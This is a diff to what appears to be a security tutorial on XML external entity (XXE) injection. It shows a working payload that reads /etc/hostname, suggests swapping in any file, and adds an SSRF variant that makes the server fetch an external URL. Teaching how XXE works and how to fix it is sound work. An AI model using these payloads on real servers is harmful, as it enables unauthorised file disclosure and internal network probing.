@@ -157,7 +157,7 @@ Connection: close
 To retrieve contents of file at `/etc/hostname` we first define an external entity as,
 
 ```xml
-  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/hostname'> ]>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
 ```
 
 and then, we use the external entity in the XML that will get returned as response to our request.
@@ -170,7 +170,7 @@ Now our full XEE payload will become,
 
 ```xml
   <?xml version="1.0" encoding="UTF-8"?>
-  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/hostname'> ]>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
   <term>&xxe;</term>
 ```
 
@@ -186,3 +186,37 @@ No results for "MY_COMPUTER."
 ```
 
 Enclosed between the quotes is our contents of `/etc/hostname`. Just replace `/etc/hostname` with any file name to retrieve it's contents.
+
+### Performing SSRF using XXE Injection
+
+It is possible to perform **SSRF** using XXE Injection.
+
+In our previous example we used XXE to read contents of file `/ect/hostname` using DTD of,
+
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
+```
+
+Now to perform a SSRF using the same entity, we would just replace the URI with an external URL.
+
+```xml
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-website.com'>]>
+```
+
+Now our payload becomes,
+
+```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-website.com'>]>
+  <term>&xxe;</term>
+```
+
+Now, as a response to the above request, we will receive anything that gets returned from `https://my-website.com`.
+
+#### Impact
+
+This payload can make the vulnerable server work as a proxy for routing web requests. A malicious actor will utilize this proxy to deliver malware and perform nefarious activities.
+
+This will also let the attacker enumerate the internal network that the compromised server has access to.
+Not just that, by making the internal server ping our own server we can log the traffic and get additional data regarding the server.
+Basically, this vulnerability is critical and should be fixed immediately.
